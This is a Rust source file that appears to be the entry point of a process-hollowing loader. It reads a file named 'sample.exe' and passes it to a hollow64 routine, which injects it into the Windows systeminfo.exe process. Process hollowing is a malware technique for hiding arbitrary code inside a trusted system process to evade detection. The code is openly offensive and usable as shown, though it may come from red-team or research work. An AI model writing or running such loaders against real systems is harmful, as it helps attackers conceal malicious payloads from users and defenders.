mod hollow; 
use hollow::*;
use std::fs::File;
use std::io::{Read};
use std::process::{exit, Command, Stdio};
use std::sync::mpsc::{channel, TryRecvError};
use log::{debug, error, info, warn};

#[cfg(debug_assertions)]
fn init_logging() {
    env_logger::builder().filter_level(log::LevelFilter::Debug).init();
}

#[cfg(not(debug_assertions))]
fn init_logging() {
    env_logger::builder().filter_level(log::LevelFilter::Info).init();
}
#[no_mangle]
pub extern "C" fn main() {
    //env_logger::init();
    init_logging();
    info!("Start process hollowing");
    call_hollow_loader();
    std::thread::sleep(std::time::Duration::from_millis(10000));
}

fn call_hollow_loader(){
    let mut buf: Vec<u8> = Vec::new();
    let file_to_load = "sample.exe";
    debug!("PE to be injected : {}",file_to_load);
    let file: Result<File, std::io::Error> = File::open(file_to_load);

    match file {
        Ok(mut f) => {
            f.read_to_end(&mut buf);
        }
        Err(_) => {
            debug!("Error openning file to load");
        }
    };
    let pe_to_exec = "C:\\Windows\\System32\\systeminfo.exe";
    debug!("PE to be holowed : {}",pe_to_exec);
    hollow64(&mut buf, pe_to_exec);
}